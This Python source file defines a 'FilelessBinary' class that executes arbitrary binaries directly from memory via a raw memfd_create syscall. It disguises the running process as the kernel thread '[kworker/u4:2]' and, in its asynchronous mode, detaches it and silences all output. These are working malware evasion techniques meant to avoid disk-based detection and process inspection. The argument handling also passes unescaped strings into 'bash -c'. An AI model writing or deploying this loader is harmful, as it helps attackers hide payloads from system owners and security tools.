class FilelessBinary:
    """
    ðŸŒªï¸ Zero-Disk Binary Execution Engine
    Uses memfd_create to execute binaries directly from memory.
    """
    @staticmethod
    def run(binary_data, name="[kworker/u4:2]", args=None, input_data=None, logger=None):
        """Execute binary from memory using memfd_create"""
        import ctypes
        import os
        import subprocess
        
        try:
            # MFD_CLOEXEC = 1
            fd = ctypes.CDLL(None).syscall(319, ctypes.c_char_p(name.encode()), ctypes.c_uint(1))
            if fd < 0:
                raise Exception(f"memfd_create failed: {os.strerror(ctypes.get_errno())}")
            
            os.write(fd, binary_data)
            
            if logger: logger.info(f"âœ… Binary resident in memfd (FD: {fd})")
            
            executable = f"/proc/self/fd/{fd}"
            # Use exec -a to rename the process and run from the FD
            cmd = ["bash", "-c", f"exec -a '{name}' {executable} " + (" ".join(args) if args else "")]
            
            proc = subprocess.Popen(
                cmd,
                start_new_session=True,
                pass_fds=(fd,),
                stdin=subprocess.PIPE if input_data else subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            if input_data:
                if isinstance(input_data, str):
                    input_data = input_data.encode()
                proc.stdin.write(input_data)
                proc.stdin.close()
                if logger: logger.info(f"âœ… Data piped to fileless process stdin ({len(input_data)} bytes)")
                
            return proc, fd
        except Exception as e:
            if logger: logger.error(f"âŒ Fileless execution failed: {e}")
            return None, -1

    @staticmethod
    def run_sync(binary_data, name="[kworker/u4:2]", args=None, input_data=None, timeout=60, logger=None):
        """Execute binary from memory and wait for completion, returning (stdout, stderr, returncode)"""
        import ctypes
        import os
        import subprocess
        
        try:
            fd = ctypes.CDLL(None).syscall(319, ctypes.c_char_p(name.encode()), ctypes.c_uint(1))
            if fd < 0: return None, None, -1
            

            os.write(fd, binary_data)
            executable = f"/proc/self/fd/{fd}"
            
            # Use bash -c to support complex arguments if needed
            cmd = ["bash", "-c", f"exec -a '{name}' {executable} " + (" ".join(args) if args else "")]
            
            proc = subprocess.Popen(
                cmd,
                pass_fds=(fd,),
                stdin=subprocess.PIPE if input_data else subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                stdout, stderr = proc.communicate(input=input_data.encode() if isinstance(input_data, str) else input_data, timeout=timeout)
                return stdout.decode('utf-8', errors='ignore'), stderr.decode('utf-8', errors='ignore'), proc.returncode
            except subprocess.TimeoutExpired:
                proc.kill()
                return "", "Timeout", -1
            finally:
                os.close(fd)
        except Exception as e:
            if logger: logger.error(f"âŒ Fileless sync execution failed: {e}")
            return None, str(e), -1

